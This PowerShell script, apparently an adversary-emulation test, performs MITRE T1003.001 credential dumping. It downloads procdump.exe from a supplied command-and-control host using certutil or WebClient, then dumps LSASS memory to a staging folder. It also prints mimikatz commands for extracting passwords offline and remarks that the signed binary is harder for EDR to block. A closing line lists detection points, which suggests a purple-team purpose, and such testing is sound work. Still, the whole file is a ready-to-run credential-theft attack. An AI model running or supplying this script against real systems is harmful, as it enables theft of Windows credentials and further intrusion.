param(
    [Parameter(Mandatory=$true)]
    [string]$C2Host
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Credential Access - Procdump LSASS..." -ForegroundColor Cyan

# T1003.001 - OS Credential Dumping: LSASS Memory
# Uses Sysinternals Procdump (signed Microsoft tool) to dump LSASS

Write-Host "[*] [T1003.001] LSASS dump via Sysinternals Procdump" -ForegroundColor Yellow
Write-Host "[!] Procdump is a Microsoft-signed binary - harder for EDR to block" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
$procdumpPath = "$stagingDir\procdump.exe"

# Step 1: Download Procdump
Write-Host "`n[*] [T1105] Downloading Procdump via certutil..."
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/procdump.exe $procdumpPath"
certutil -urlcache -split -f "http://$C2Host/tools/procdump.exe" $procdumpPath

if (-not (Test-Path $procdumpPath)) {
    Write-Host "[-] certutil download failed. Trying WebClient..." -ForegroundColor Red
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/procdump.exe", $procdumpPath)
    } catch {
        Write-Host "[-] Download failed." -ForegroundColor Red
    }
}

if (Test-Path $procdumpPath) {
    Write-Host "[+] Procdump downloaded successfully" -ForegroundColor Green
    
    # Step 2: Accept EULA silently
    Write-Host "`n[*] Accepting Procdump EULA..."
    & $procdumpPath -accepteula 2>&1 | Out-Null
    
    # Step 3: Dump LSASS
    $lsass = Get-Process lsass -ErrorAction SilentlyContinue
    if ($lsass) {
        Write-Host "`n[*] [T1003.001] Dumping LSASS (PID: $($lsass.Id))..."
        $dumpFile = "$stagingDir\lsass.dmp"
        
        # Method 1: Dump by process name
        Write-Host "    CMD: procdump.exe -ma lsass.exe $dumpFile"
        & $procdumpPath -accepteula -ma lsass.exe $dumpFile 2>&1
        
        if (Test-Path $dumpFile) {
            $size = [math]::Round((Get-Item $dumpFile).Length / 1MB, 2)
            Write-Host "[+] LSASS dump successful: $dumpFile ($size MB)" -ForegroundColor Green
        } else {
            # Method 2: Dump by PID (alternative)
            Write-Host "[-] Name-based dump failed, trying PID..." -ForegroundColor Yellow
            Write-Host "    CMD: procdump.exe -ma $($lsass.Id) $dumpFile"
            & $procdumpPath -accepteula -ma $lsass.Id $dumpFile 2>&1
        }
        
        if (Test-Path $dumpFile) {
            $size = [math]::Round((Get-Item $dumpFile).Length / 1MB, 2)
            Write-Host "`n[+] LSASS dump saved: $dumpFile ($size MB)" -ForegroundColor Green
            Write-Host "[!] Offline extraction: mimikatz `"sekurlsa::minidump lsass.dmp`" `"sekurlsa::logonpasswords`"" -ForegroundColor Yellow
        }
    } else {
        Write-Host "[-] LSASS process not found" -ForegroundColor Red
    }
} else {
    Write-Host "[-] Procdump not available" -ForegroundColor Red
}

Write-Host "`n[+] Procdump LSASS Dump Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: procdump.exe accessing LSASS, process memory dump, certutil download" -ForegroundColor Yellow
